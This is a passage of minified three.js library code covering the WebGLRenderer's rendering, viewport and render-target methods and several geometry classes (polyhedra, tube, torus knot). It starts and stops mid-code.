y(t,e){t.roughness.value=e.roughness,t.metalness.value=e.metalness,e.roughnessMap&&(t.roughnessMap.value=e.roughnessMap),e.metalnessMap&&(t.metalnessMap.value=e.metalnessMap),e.emissiveMap&&(t.emissiveMap.value=e.emissiveMap),e.bumpMap&&(t.bumpMap.value=e.bumpMap,t.bumpScale.value=e.bumpScale,1===e.side&&(t.bumpScale.value*=-1)),e.normalMap&&(t.normalMap.value=e.normalMap,t.normalScale.value.copy(e.normalScale),1===e.side&&t.normalScale.value.negate()),e.displacementMap&&(t.displacementMap.value=e.displacementMap,t.displacementScale.value=e.displacementScale,t.displacementBias.value=e.displacementBias),e.envMap&&(t.envMapIntensity.value=e.envMapIntensity)}var x=void 0!==(t=t||{}).canvas?t.canvas:document.createElementNS("http://www.w3.org/1999/xhtml","canvas"),b=void 0!==t.context?t.context:null,w=void 0!==t.alpha&&t.alpha,_=void 0===t.depth||t.depth,M=void 0===t.stencil||t.stencil,S=void 0!==t.antialias&&t.antialias,T=void 0===t.premultipliedAlpha||t.premultipliedAlpha,E=void 0!==t.preserveDrawingBuffer&&t.preserveDrawingBuffer,C=void 0!==t.powerPreference?t.powerPreference:"default",A=void 0!==t.failIfMajorPerformanceCaveat&&t.failIfMajorPerformanceCaveat,L=null,P=null;this.domElement=x,this.debug={checkShaderErrors:!0},this.sortObjects=this.autoClearStencil=this.autoClearDepth=this.autoClearColor=this.autoClear=!0,this.clippingPlanes=[],this.localClippingEnabled=!1,this.gammaFactor=2,this.physicallyCorrectLights=this.gammaOutput=this.gammaInput=!1,this.toneMappingWhitePoint=this.toneMappingExposure=this.toneMapping=1,this.maxMorphTargets=8,this.maxMorphNormals=4;var R,O,I,z,D,N,k,B,F,H,G,j,U,V,W,X,Y,$=this,Z=!1,J=null,K=0,tt=0,rt=null,at=null,ft=-1,vt=e=null,yt=!1,xt=null,bt=null,wt=new s,_t=new s,Mt=null,St=x.width,Tt=x.height,Et=1,Ct=new s(0,0,St,Tt),At=new s(0,0,St,Tt),Lt=!1,Pt=new et,Rt=new ct,Ot=!1,It=!1,zt=new h,Dt=new r;try{w={alpha:w,depth:_,stencil:M,antialias:S,premultipliedAlpha:T,preserveDrawingBuffer:E,powerPreference:C,failIfMajorPerformanceCaveat:A,xrCompatible:!0},x.addEventListener("webglcontextlost",a,!1),x.addEventListener("webglcontextrestored",o,!1);var Nt=b||x.getContext("webgl",w)||x.getContext("experimental-webgl",w);if(null===Nt){if(null!==x.getContext("webgl"))throw Error("Error creating WebGL context with your selected attributes.");throw Error("Error creating WebGL context.")}void 0===Nt.getShaderPrecisionFormat&&(Nt.getShaderPrecisionFormat=function(){return{rangeMin:1,rangeMax:1,precision:1}})}catch(t){throw console.error("THREE.WebGLRenderer: "+t.message),t}n();var kt="undefined"!=typeof navigator&&"xr"in navigator&&"supportsSession"in navigator.xr?new De($,Nt):new ze($);this.vr=kt;var Bt=new Ce($,F,O.maxTextureSize);this.shadowMap=Bt,this.getContext=function(){return Nt},this.getContextAttributes=function(){return Nt.getContextAttributes()},this.forceContextLoss=function(){var t=R.get("WEBGL_lose_context");t&&t.loseContext()},this.forceContextRestore=function(){var t=R.get("WEBGL_lose_context");t&&t.restoreContext()},this.getPixelRatio=function(){return Et},this.setPixelRatio=function(t){void 0!==t&&(Et=t,this.setSize(St,Tt,!1))},this.getSize=function(t){return void 0===t&&(console.warn("WebGLRenderer: .getsize() now requires a Vector2 as an argument"),t=new i),t.set(St,Tt)},this.setSize=function(t,e,i){kt.isPresenting()?console.warn("THREE.WebGLRenderer: Can't change size while VR device is presenting."):(St=t,Tt=e,x.width=Math.floor(t*Et),x.height=Math.floor(e*Et),!1!==i&&(x.style.width=t+"px",x.style.height=e+"px"),this.setViewport(0,0,t,e))},this.getDrawingBufferSize=function(t){return void 0===t&&(console.warn("WebGLRenderer: .getdrawingBufferSize() now requires a Vector2 as an argument"),t=new i),t.set(St*Et,Tt*Et).floor()},this.setDrawingBufferSize=function(t,e,i){St=t,Tt=e,Et=i,x.width=Math.floor(t*i),x.height=Math.floor(e*i),this.setViewport(0,0,t,e)},this.getCurrentViewport=function(t){return void 0===t&&(console.warn("WebGLRenderer: .getCurrentViewport() now requires a Vector4 as an argument"),t=new s),t.copy(wt)},this.getViewport=function(t){return t.copy(Ct)},this.setViewport=function(t,e,i,n){t.isVector4?Ct.set(t.x,t.y,t.z,t.w):Ct.set(t,e,i,n),I.viewport(wt.copy(Ct).multiplyScalar(Et).floor())},this.getScissor=function(t){return t.copy(At)},this.setScissor=function(t,e,i,n){t.isVector4?At.set(t.x,t.y,t.z,t.w):At.set(t,e,i,n),I.scissor(_t.copy(At).multiplyScalar(Et).floor())},this.getScissorTest=function(){return Lt},this.setScissorTest=function(t){I.setScissorTest(Lt=t)},this.getClearColor=function(){return U.getClearColor()},this.setClearColor=function(){U.setClearColor.apply(U,arguments)},this.getClearAlpha=function(){return U.getClearAlpha()},this.setClearAlpha=function(){U.setClearAlpha.apply(U,arguments)},this.clear=function(t,e,i){var n=0;(void 0===t||t)&&(n|=16384),(void 0===e||e)&&(n|=256),(void 0===i||i)&&(n|=1024),Nt.clear(n)},this.clearColor=function(){this.clear(!0,!1,!1)},this.clearDepth=function(){this.clear(!1,!0,!1)},this.clearStencil=function(){this.clear(!1,!1,!0)},this.dispose=function(){x.removeEventListener("webglcontextlost",a,!1),x.removeEventListener("webglcontextrestored",o,!1),G.dispose(),j.dispose(),D.dispose(),F.dispose(),kt.dispose(),Ht.stop()},this.renderBufferImmediate=function(t,e){I.initAttributes();var i=D.get(t);t.hasPositions&&!i.position&&(i.position=Nt.createBuffer()),t.hasNormals&&!i.normal&&(i.normal=Nt.createBuffer()),t.hasUvs&&!i.uv&&(i.uv=Nt.createBuffer()),t.hasColors&&!i.color&&(i.color=Nt.createBuffer()),e=e.getAttributes(),t.hasPositions&&(Nt.bindBuffer(34962,i.position),Nt.bufferData(34962,t.positionArray,35048),I.enableAttribute(e.position),Nt.vertexAttribPointer(e.position,3,5126,!1,0,0)),t.hasNormals&&(Nt.bindBuffer(34962,i.normal),Nt.bufferData(34962,t.normalArray,35048),I.enableAttribute(e.normal),Nt.vertexAttribPointer(e.normal,3,5126,!1,0,0)),t.hasUvs&&(Nt.bindBuffer(34962,i.uv),Nt.bufferData(34962,t.uvArray,35048),I.enableAttribute(e.uv),Nt.vertexAttribPointer(e.uv,2,5126,!1,0,0)),t.hasColors&&(Nt.bindBuffer(34962,i.color),Nt.bufferData(34962,t.colorArray,35048),I.enableAttribute(e.color),Nt.vertexAttribPointer(e.color,3,5126,!1,0,0)),I.disableUnusedAttributes(),Nt.drawArrays(4,0,t.count),t.count=0},this.renderBufferDirect=function(t,i,n,r,a,o){var s=a.isMesh&&0>a.matrixWorld.determinant();I.setMaterial(r,s);var l=m(t,i,r,a),c=!1;e===n.id&&vt===l.id&&yt===(!0===r.wireframe)||(e=n.id,vt=l.id,yt=!0===r.wireframe,c=!0),a.morphTargetInfluences&&(V.update(a,n,r,l),c=!0),s=n.index;var h=n.attributes.position;if(i=1,!0===r.wireframe&&(s=B.getWireframeAttribute(n),i=2),t=W,null!==s){var u=k.get(s);(t=X).setIndex(u)}if(c){if(n&&n.isInstancedBufferGeometry&&!O.isWebGL2&&null===R.get("ANGLE_instanced_arrays"))console.error("THREE.WebGLRenderer.setupVertexAttributes: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.");else{I.initAttributes(),c=n.attributes,l=l.getAttributes();var d=r.defaultAttributeValues;for(M in l){var p=l[M];if(0<=p){var f=c[M];if(void 0!==f){var g=f.normalized,v=f.itemSize,y=k.get(f);if(void 0!==y){var x=y.buffer,b=y.type;if(y=y.bytesPerElement,f.isInterleavedBufferAttribute){var w=f.data,_=w.stride;f=f.offset,w&&w.isInstancedInterleavedBuffer?(I.enableAttributeAndDivisor(p,w.meshPerAttribute),void 0===n.maxInstancedCount&&(n.maxInstancedCount=w.meshPerAttribute*w.count)):I.enableAttribute(p),Nt.bindBuffer(34962,x),Nt.vertexAttribPointer(p,v,b,g,_*y,f*y)}else f.isInstancedBufferAttribute?(I.enableAttributeAndDivisor(p,f.meshPerAttribute),void 0===n.maxInstancedCount&&(n.maxInstancedCount=f.meshPerAttribute*f.count)):I.enableAttribute(p),Nt.bindBuffer(34962,x),Nt.vertexAttribPointer(p,v,b,g,0,0)}}else if(void 0!==d&&void 0!==(g=d[M]))switch(g.length){case 2:Nt.vertexAttrib2fv(p,g);break;case 3:Nt.vertexAttrib3fv(p,g);break;case 4:Nt.vertexAttrib4fv(p,g);break;default:Nt.vertexAttrib1fv(p,g)}}}I.disableUnusedAttributes()}null!==s&&Nt.bindBuffer(34963,u.buffer)}u=1/0,null!==s?u=s.count:void 0!==h&&(u=h.count),s=n.drawRange.start*i,h=null!==o?o.start*i:0;var M=Math.max(s,h);if(0!==(o=Math.max(0,Math.min(u,s+n.drawRange.count*i,h+(null!==o?o.count*i:1/0))-1-M+1))){if(a.isMesh)if(!0===r.wireframe)I.setLineWidth(r.wireframeLinewidth*(null===rt?Et:1)),t.setMode(1);else switch(a.drawMode){case 0:t.setMode(4);break;case 1:t.setMode(5);break;case 2:t.setMode(6)}else a.isLine?(void 0===(r=r.linewidth)&&(r=1),I.setLineWidth(r*(null===rt?Et:1)),a.isLineSegments?t.setMode(1):a.isLineLoop?t.setMode(2):t.setMode(3)):a.isPoints?t.setMode(0):a.isSprite&&t.setMode(4);n&&n.isInstancedBufferGeometry?0<n.maxInstancedCount&&t.renderInstances(n,M,o):t.render(M,o)}},this.compile=function(t,e){(P=j.get(t,e)).init(),t.traverse((function(t){t.isLight&&(P.pushLight(t),t.castShadow&&P.pushShadow(t))})),P.setupLights(e),t.traverse((function(e){if(e.material)if(Array.isArray(e.material))for(var i=0;i<e.material.length;i++)f(e.material[i],t.fog,e);else f(e.material,t.fog,e)}))};var Ft=null,Ht=new it;Ht.setAnimationLoop((function(t){kt.isPresenting()||Ft&&Ft(t)})),"undefined"!=typeof window&&Ht.setContext(window),this.setAnimationLoop=function(t){Ft=t,kt.setAnimationLoop(t),Ht.start()},this.render=function(t,i,n,r){if(void 0!==n){console.warn("THREE.WebGLRenderer.render(): the renderTarget argument has been removed. Use .setRenderTarget() instead.");var a=n}if(void 0!==r){console.warn("THREE.WebGLRenderer.render(): the forceClear argument has been removed. Use .clear() instead.");var o=r}i&&i.isCamera?Z||(vt=e=null,yt=!1,ft=-1,xt=null,!0===t.autoUpdate&&t.updateMatrixWorld(),null===i.parent&&i.updateMatrixWorld(),kt.enabled&&(i=kt.getCamera(i)),(P=j.get(t,i)).init(),t.onBeforeRender($,t,i,a||rt),zt.multiplyMatrices(i.projectionMatrix,i.matrixWorldInverse),Pt.setFromMatrix(zt),It=this.localClippingEnabled,Ot=Rt.init(this.clippingPlanes,It,i),(L=G.get(t,i)).init(),u(t,i,0,$.sortObjects),!0===$.sortObjects&&L.sort(),Ot&&Rt.beginShadows(),Bt.render(P.state.shadowsArray,t,i),P.setupLights(i),Ot&&Rt.endShadows(),this.info.autoReset&&this.info.reset(),void 0!==a&&this.setRenderTarget(a),U.render(L,t,i,o),n=L.opaque,r=L.transparent,t.overrideMaterial?(a=t.overrideMaterial,n.length&&d(n,t,i,a),r.length&&d(r,t,i,a)):(n.length&&d(n,t,i),r.length&&d(r,t,i)),t.onAfterRender($,t,i),null!==rt&&(N.updateRenderTargetMipmap(rt),N.updateMultisampleRenderTarget(rt)),I.buffers.depth.setTest(!0),I.buffers.depth.setMask(!0),I.buffers.color.setMask(!0),I.setPolygonOffset(!1),kt.enabled&&kt.submitFrame(),P=L=null):console.error("THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.")},this.setFramebuffer=function(t){J!==t&&Nt.bindFramebuffer(36160,t),J=t},this.getActiveCubeFace=function(){return K},this.getActiveMipmapLevel=function(){return tt},this.getRenderTarget=function(){return rt},this.setRenderTarget=function(t,e,i){rt=t,K=e,tt=i,t&&void 0===D.get(t).__webglFramebuffer&&N.setupRenderTarget(t);var n=J,r=!1;t?(n=D.get(t).__webglFramebuffer,t.isWebGLRenderTargetCube?(n=n[e||0],r=!0):n=t.isWebGLMultisampleRenderTarget?D.get(t).__webglMultisampledFramebuffer:n,wt.copy(t.viewport),_t.copy(t.scissor),Mt=t.scissorTest):(wt.copy(Ct).multiplyScalar(Et).floor(),_t.copy(At).multiplyScalar(Et).floor(),Mt=Lt),at!==n&&(Nt.bindFramebuffer(36160,n),at=n),I.viewport(wt),I.scissor(_t),I.setScissorTest(Mt),r&&(t=D.get(t.texture),Nt.framebufferTexture2D(36160,36064,34069+(e||0),t.__webglTexture,i||0))},this.readRenderTargetPixels=function(t,e,i,n,r,a,o){if(t&&t.isWebGLRenderTarget){var s=D.get(t).__webglFramebuffer;if(t.isWebGLRenderTargetCube&&void 0!==o&&(s=s[o]),s){o=!1,s!==at&&(Nt.bindFramebuffer(36160,s),o=!0);try{var l=t.texture,c=l.format,h=l.type;1023!==c&&Y.convert(c)!==Nt.getParameter(35739)?console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format."):1009===h||Y.convert(h)===Nt.getParameter(35738)||1015===h&&(O.isWebGL2||R.get("OES_texture_float")||R.get("WEBGL_color_buffer_float"))||1016===h&&(O.isWebGL2?R.get("EXT_color_buffer_float"):R.get("EXT_color_buffer_half_float"))?36053===Nt.checkFramebufferStatus(36160)?0<=e&&e<=t.width-n&&0<=i&&i<=t.height-r&&Nt.readPixels(e,i,n,r,Y.convert(c),Y.convert(h),a):console.error("THREE.WebGLRenderer.readRenderTargetPixels: readPixels from renderTarget failed. Framebuffer not complete."):console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in UnsignedByteType or implementation defined type.")}finally{o&&Nt.bindFramebuffer(36160,at)}}}else console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.")},this.copyFramebufferToTexture=function(t,e,i){var n=e.image.width,r=e.image.height,a=Y.convert(e.format);N.setTexture2D(e,0),Nt.copyTexImage2D(3553,i||0,a,t.x,t.y,n,r,0)},this.copyTextureToTexture=function(t,e,i,n){var r=e.image.width,a=e.image.height,o=Y.convert(i.format),s=Y.convert(i.type);N.setTexture2D(i,0),e.isDataTexture?Nt.texSubImage2D(3553,n||0,t.x,t.y,r,a,o,s,e.image.data):Nt.texSubImage2D(3553,n||0,t.x,t.y,o,s,e.image)},"undefined"!=typeof __THREE_DEVTOOLS__&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}function ke(t,e){this.name="",this.color=new b(t),this.density=void 0!==e?e:25e-5}function Be(t,e,i){this.name="",this.color=new b(t),this.near=void 0!==e?e:1,this.far=void 0!==i?i:1e3}function Fe(t,e){this.array=t,this.stride=e,this.count=void 0!==t?t.length/e:0,this.dynamic=!1,this.updateRange={offset:0,count:-1},this.version=0}function He(t,e,i,n){this.data=t,this.itemSize=e,this.offset=i,this.normalized=!0===n}function Ge(t){T.call(this),this.type="SpriteMaterial",this.color=new b(16777215),this.map=null,this.rotation=0,this.sizeAttenuation=!0,this.lights=!1,this.transparent=!0,this.setValues(t)}function je(t){if(p.call(this),this.type="Sprite",void 0===zs){zs=new F;var e=new Float32Array([-.5,-.5,0,0,0,.5,-.5,0,1,0,.5,.5,0,1,1,-.5,.5,0,0,1]);e=new Fe(e,5),zs.setIndex([0,1,2,0,2,3]),zs.addAttribute("position",new He(e,3,0,!1)),zs.addAttribute("uv",new He(e,2,3,!1))}this.geometry=zs,this.material=void 0!==t?t:new Ge,this.center=new i(.5,.5)}function Ue(t,e,i,n,r,a){Bs.subVectors(t,i).addScalar(.5).multiply(n),void 0!==r?(Fs.x=a*Bs.x-r*Bs.y,Fs.y=r*Bs.x+a*Bs.y):Fs.copy(Bs),t.copy(e),t.x+=Fs.x,t.y+=Fs.y,t.applyMatrix4(Hs)}function Ve(){p.call(this),this.type="LOD",Object.defineProperties(this,{levels:{enumerable:!0,value:[]}}),this.autoUpdate=!0}function We(t,e){t&&t.isGeometry&&console.error("THREE.SkinnedMesh no longer supports THREE.Geometry. Use THREE.BufferGeometry instead."),H.call(this,t,e),this.type="SkinnedMesh",this.bindMode="attached",this.bindMatrix=new h,this.bindMatrixInverse=new h}function qe(t,e){if(t=t||[],this.bones=t.slice(0),this.boneMatrices=new Float32Array(16*this.bones.length),void 0===e)this.calculateInverses();else if(this.bones.length===e.length)this.boneInverses=e.slice(0);else for(console.warn("THREE.Skeleton boneInverses is the wrong length."),this.boneInverses=[],t=0,e=this.bones.length;t<e;t++)this.boneInverses.push(new h)}function Xe(){p.call(this),this.type="Bone"}function Ye(t){T.call(this),this.type="LineBasicMaterial",this.color=new b(16777215),this.linewidth=1,this.linejoin=this.linecap="round",this.lights=!1,this.setValues(t)}function $e(t,e,i){1===i&&console.error("THREE.Line: parameter THREE.LinePieces no longer supported. Use THREE.LineSegments instead."),p.call(this),this.type="Line",this.geometry=void 0!==t?t:new F,this.material=void 0!==e?e:new Ye({color:16777215*Math.random()})}function Ze(t,e){$e.call(this,t,e),this.type="LineSegments"}function Je(t,e){$e.call(this,t,e),this.type="LineLoop"}function Ke(t){T.call(this),this.type="PointsMaterial",this.color=new b(16777215),this.map=null,this.size=1,this.sizeAttenuation=!0,this.lights=this.morphTargets=!1,this.setValues(t)}function Qe(t,e){p.call(this),this.type="Points",this.geometry=void 0!==t?t:new F,this.material=void 0!==e?e:new Ke({color:16777215*Math.random()}),this.updateMorphTargets()}function ti(t,e,i,n,a,o,s){var l=al.distanceSqToPoint(t);l<i&&(i=new r,al.closestPointToPoint(t,i),i.applyMatrix4(n),(t=a.ray.origin.distanceTo(i))<a.near||t>a.far||o.push({distance:t,distanceToRay:Math.sqrt(l),point:i,index:e,face:null,object:s}))}function ei(t,e,i,n,r,a,s,l,c){o.call(this,t,e,i,n,r,a,s,l,c),this.format=void 0!==s?s:1022,this.minFilter=void 0!==a?a:1006,this.magFilter=void 0!==r?r:1006,this.generateMipmaps=!1}function ii(t,e,i,n,r,a,s,l,c,h,u,d){o.call(this,null,a,s,l,c,h,n,r,u,d),this.image={width:e,height:i},this.mipmaps=t,this.generateMipmaps=this.flipY=!1}function ni(t,e,i,n,r,a,s,l,c){o.call(this,t,e,i,n,r,a,s,l,c),this.needsUpdate=!0}function ri(t,e,i,n,r,a,s,l,c,h){if(1026!==(h=void 0!==h?h:1026)&&1027!==h)throw Error("DepthTexture format must be either THREE.DepthFormat or THREE.DepthStencilFormat");void 0===i&&1026===h&&(i=1012),void 0===i&&1027===h&&(i=1020),o.call(this,null,n,r,a,s,l,h,i,c),this.image={width:t,height:e},this.magFilter=void 0!==s?s:1003,this.minFilter=void 0!==l?l:1003,this.generateMipmaps=this.flipY=!1}function ai(t){F.call(this),this.type="WireframeGeometry";var e,i,n,a=[],o=[0,0],s={},l=["a","b","c"];if(t&&t.isGeometry){var c=t.faces,h=0;for(i=c.length;h<i;h++){var u=c[h];for(e=0;3>e;e++){var d=u[l[e]],p=u[l[(e+1)%3]];o[0]=Math.min(d,p),o[1]=Math.max(d,p),void 0===s[d=o[0]+","+o[1]]&&(s[d]={index1:o[0],index2:o[1]})}}for(d in s)h=s[d],l=t.vertices[h.index1],a.push(l.x,l.y,l.z),l=t.vertices[h.index2],a.push(l.x,l.y,l.z)}else if(t&&t.isBufferGeometry)if(l=new r,null!==t.index){c=t.attributes.position,u=t.index;var f=t.groups;for(0===f.length&&(f=[{start:0,count:u.count,materialIndex:0}]),t=0,n=f.length;t<n;++t)for(e=(h=f[t]).start,i=h.count,h=e,i=e+i;h<i;h+=3)for(e=0;3>e;e++)d=u.getX(h+e),p=u.getX(h+(e+1)%3),o[0]=Math.min(d,p),o[1]=Math.max(d,p),void 0===s[d=o[0]+","+o[1]]&&(s[d]={index1:o[0],index2:o[1]});for(d in s)h=s[d],l.fromBufferAttribute(c,h.index1),a.push(l.x,l.y,l.z),l.fromBufferAttribute(c,h.index2),a.push(l.x,l.y,l.z)}else for(h=0,i=(c=t.attributes.position).count/3;h<i;h++)for(e=0;3>e;e++)s=3*h+e,l.fromBufferAttribute(c,s),a.push(l.x,l.y,l.z),s=3*h+(e+1)%3,l.fromBufferAttribute(c,s),a.push(l.x,l.y,l.z);this.addAttribute("position",new D(a,3))}function oi(t,e,i){U.call(this),this.type="ParametricGeometry",this.parameters={func:t,slices:e,stacks:i},this.fromBufferGeometry(new si(t,e,i)),this.mergeVertices()}function si(t,e,i){F.call(this),this.type="ParametricBufferGeometry",this.parameters={func:t,slices:e,stacks:i};var n,a,o=[],s=[],l=[],c=[],h=new r,u=new r,d=new r,p=new r,f=new r;3>t.length&&console.error("THREE.ParametricGeometry: Function must now modify a Vector3 as third parameter.");var m=e+1;for(n=0;n<=i;n++){var g=n/i;for(a=0;a<=e;a++){var v=a/e;t(v,g,u),s.push(u.x,u.y,u.z),0<=v-1e-5?(t(v-1e-5,g,d),p.subVectors(u,d)):(t(v+1e-5,g,d),p.subVectors(d,u)),0<=g-1e-5?(t(v,g-1e-5,d),f.subVectors(u,d)):(t(v,g+1e-5,d),f.subVectors(d,u)),h.crossVectors(p,f).normalize(),l.push(h.x,h.y,h.z),c.push(v,g)}}for(n=0;n<i;n++)for(a=0;a<e;a++)t=n*m+a+1,h=(n+1)*m+a+1,u=(n+1)*m+a,o.push(n*m+a,t,u),o.push(t,h,u);this.setIndex(o),this.addAttribute("position",new D(s,3)),this.addAttribute("normal",new D(l,3)),this.addAttribute("uv",new D(c,2))}function li(t,e,i,n){U.call(this),this.type="PolyhedronGeometry",this.parameters={vertices:t,indices:e,radius:i,detail:n},this.fromBufferGeometry(new ci(t,e,i,n)),this.mergeVertices()}function ci(t,e,n,a){function o(t){c.push(t.x,t.y,t.z)}function s(e,i){e*=3,i.x=t[e+0],i.y=t[e+1],i.z=t[e+2]}function l(t,e,i,n){0>n&&1===t.x&&(h[e]=t.x-1),0===i.x&&0===i.z&&(h[e]=n/2/Math.PI+.5)}F.call(this),this.type="PolyhedronBufferGeometry",this.parameters={vertices:t,indices:e,radius:n,detail:a},n=n||1;var c=[],h=[];!function(t){for(var i=new r,n=new r,a=new r,l=0;l<e.length;l+=3){s(e[l+0],i),s(e[l+1],n),s(e[l+2],a);var c,h,u=i,d=n,p=a,f=Math.pow(2,t),m=[];for(h=0;h<=f;h++){m[h]=[];var g=u.clone().lerp(p,h/f),v=d.clone().lerp(p,h/f),y=f-h;for(c=0;c<=y;c++)m[h][c]=0===c&&h===f?g:g.clone().lerp(v,c/y)}for(h=0;h<f;h++)for(c=0;c<2*(f-h)-1;c++)u=Math.floor(c/2),0==c%2?(o(m[h][u+1]),o(m[h+1][u]),o(m[h][u])):(o(m[h][u+1]),o(m[h+1][u+1]),o(m[h+1][u]))}}(a=a||0),function(t){for(var e=new r,i=0;i<c.length;i+=3)e.x=c[i+0],e.y=c[i+1],e.z=c[i+2],e.normalize().multiplyScalar(t),c[i+0]=e.x,c[i+1]=e.y,c[i+2]=e.z}(n),function(){for(var t=new r,e=0;e<c.length;e+=3)t.x=c[e+0],t.y=c[e+1],t.z=c[e+2],h.push(Math.atan2(t.z,-t.x)/2/Math.PI+.5,1-(Math.atan2(-t.y,Math.sqrt(t.x*t.x+t.z*t.z))/Math.PI+.5));t=new r,e=new r;for(var n=new r,a=new r,o=new i,s=new i,u=new i,d=0,p=0;d<c.length;d+=9,p+=6){t.set(c[d+0],c[d+1],c[d+2]),e.set(c[d+3],c[d+4],c[d+5]),n.set(c[d+6],c[d+7],c[d+8]),o.set(h[p+0],h[p+1]),s.set(h[p+2],h[p+3]),u.set(h[p+4],h[p+5]),a.copy(t).add(e).add(n).divideScalar(3);var f=Math.atan2(a.z,-a.x);l(o,p+0,t,f),l(s,p+2,e,f),l(u,p+4,n,f)}for(t=0;t<h.length;t+=6)e=h[t+0],n=h[t+2],a=h[t+4],o=Math.min(e,n,a),.9<Math.max(e,n,a)&&.1>o&&(.2>e&&(h[t+0]+=1),.2>n&&(h[t+2]+=1),.2>a&&(h[t+4]+=1))}(),this.addAttribute("position",new D(c,3)),this.addAttribute("normal",new D(c.slice(),3)),this.addAttribute("uv",new D(h,2)),0===a?this.computeVertexNormals():this.normalizeNormals()}function hi(t,e){U.call(this),this.type="TetrahedronGeometry",this.parameters={radius:t,detail:e},this.fromBufferGeometry(new ui(t,e)),this.mergeVertices()}function ui(t,e){ci.call(this,[1,1,1,-1,-1,1,-1,1,-1,1,-1,-1],[2,1,0,0,3,2,1,3,0,2,3,1],t,e),this.type="TetrahedronBufferGeometry",this.parameters={radius:t,detail:e}}function di(t,e){U.call(this),this.type="OctahedronGeometry",this.parameters={radius:t,detail:e},this.fromBufferGeometry(new pi(t,e)),this.mergeVertices()}function pi(t,e){ci.call(this,[1,0,0,-1,0,0,0,1,0,0,-1,0,0,0,1,0,0,-1],[0,2,4,0,4,3,0,3,5,0,5,2,1,2,5,1,5,3,1,3,4,1,4,2],t,e),this.type="OctahedronBufferGeometry",this.parameters={radius:t,detail:e}}function fi(t,e){U.call(this),this.type="IcosahedronGeometry",this.parameters={radius:t,detail:e},this.fromBufferGeometry(new mi(t,e)),this.mergeVertices()}function mi(t,e){var i=(1+Math.sqrt(5))/2;ci.call(this,[-1,i,0,1,i,0,-1,-i,0,1,-i,0,0,-1,i,0,1,i,0,-1,-i,0,1,-i,i,0,-1,i,0,1,-i,0,-1,-i,0,1],[0,11,5,0,5,1,0,1,7,0,7,10,0,10,11,1,5,9,5,11,4,11,10,2,10,7,6,7,1,8,3,9,4,3,4,2,3,2,6,3,6,8,3,8,9,4,9,5,2,4,11,6,2,10,8,6,7,9,8,1],t,e),this.type="IcosahedronBufferGeometry",this.parameters={radius:t,detail:e}}function gi(t,e){U.call(this),this.type="DodecahedronGeometry",this.parameters={radius:t,detail:e},this.fromBufferGeometry(new vi(t,e)),this.mergeVertices()}function vi(t,e){var i=(1+Math.sqrt(5))/2,n=1/i;ci.call(this,[-1,-1,-1,-1,-1,1,-1,1,-1,-1,1,1,1,-1,-1,1,-1,1,1,1,-1,1,1,1,0,-n,-i,0,-n,i,0,n,-i,0,n,i,-n,-i,0,-n,i,0,n,-i,0,n,i,0,-i,0,-n,i,0,-n,-i,0,n,i,0,n],[3,11,7,3,7,15,3,15,13,7,19,17,7,17,6,7,6,15,17,4,8,17,8,10,17,10,6,8,0,16,8,16,2,8,2,10,0,12,1,0,1,18,0,18,16,6,10,2,6,2,13,6,13,15,2,16,18,2,18,3,2,3,13,18,1,9,18,9,11,18,11,3,4,14,12,4,12,0,4,0,8,11,9,5,11,5,19,11,19,7,19,5,14,19,14,4,19,4,17,1,12,14,1,14,5,1,5,9],t,e),this.type="DodecahedronBufferGeometry",this.parameters={radius:t,detail:e}}function yi(t,e,i,n,r,a){U.call(this),this.type="TubeGeometry",this.parameters={path:t,tubularSegments:e,radius:i,radialSegments:n,closed:r},void 0!==a&&console.warn("THREE.TubeGeometry: taper has been removed."),t=new xi(t,e,i,n,r),this.tangents=t.tangents,this.normals=t.normals,this.binormals=t.binormals,this.fromBufferGeometry(t),this.mergeVertices()}function xi(t,e,n,a,o){function s(i){f=t.getPointAt(i/e,f);var r=l.normals[i];for(i=l.binormals[i],h=0;h<=a;h++){var o=h/a*Math.PI*2,s=Math.sin(o);o=-Math.cos(o),d.x=o*r.x+s*i.x,d.y=o*r.y+s*i.y,d.z=o*r.z+s*i.z,d.normalize(),g.push(d.x,d.y,d.z),u.x=f.x+n*d.x,u.y=f.y+n*d.y,u.z=f.z+n*d.z,m.push(u.x,u.y,u.z)}}F.call(this),this.type="TubeBufferGeometry",this.parameters={path:t,tubularSegments:e,radius:n,radialSegments:a,closed:o},e=e||64,n=n||1,a=a||8,o=o||!1;var l=t.computeFrenetFrames(e,o);this.tangents=l.tangents,this.normals=l.normals,this.binormals=l.binormals;var c,h,u=new r,d=new r,p=new i,f=new r,m=[],g=[],v=[],y=[];for(c=0;c<e;c++)s(c);for(s(!1===o?e:0),c=0;c<=e;c++)for(h=0;h<=a;h++)p.x=c/e,p.y=h/a,v.push(p.x,p.y);!function(){for(h=1;h<=e;h++)for(c=1;c<=a;c++){var t=(a+1)*h+(c-1),i=(a+1)*h+c,n=(a+1)*(h-1)+c;y.push((a+1)*(h-1)+(c-1),t,n),y.push(t,i,n)}}(),this.setIndex(y),this.addAttribute("position",new D(m,3)),this.addAttribute("normal",new D(g,3)),this.addAttribute("uv",new D(v,2))}function bi(t,e,i,n,r,a,o){U.call(this),this.type="TorusKnotGeometry",this.parameters={radius:t,tube:e,tubularSegments:i,radialSegments:n,p:r,q:a},void 0!==o&&console.warn("THREE.TorusKnotGeometry: heightScale has been deprecated. Use .scale( x, y, z ) instead."),this.fromBufferGeometry(new wi(t,e,i,n,r,a)),this.mergeVertices()}function wi(t,e,i,n,a,o){function s(t,e,i,n,r){var a=Math.sin(t);e=i/e*t,i=Math.cos(e),r.x=n*(2+i)*.5*Math.cos(t),r.y=n*(2+i)*a*.5,r.z=n*Math.sin(e)*.5}F.call(this),this.type="TorusKnotBufferGeometry",this.parameters={radius:t,tube:e,tubularSegments:i,radialSegments:n,p:a,q:o},t=t||1,e=e||.4,i=Math.floor(i)||64,n=Math.floor(n)||8,a=a||2,o=o||3;var l,c=[],h=[],u=[],d=[],p=new r,f=new r,m=new r,g=new r,v=new r,y=new r,x=new r;for(l=0;l<=i;++l){var b=l/i*a*Math.PI*2;for(s(b,a,o,t,m),s(b+.01,a,o,t,g),y.subVectors(g,m),x.addVectors(g,m),v.crossVectors(y,x),x.crossVectors(v,y),v.normalize(),x.normalize(),b=0;b<=n;++b){var 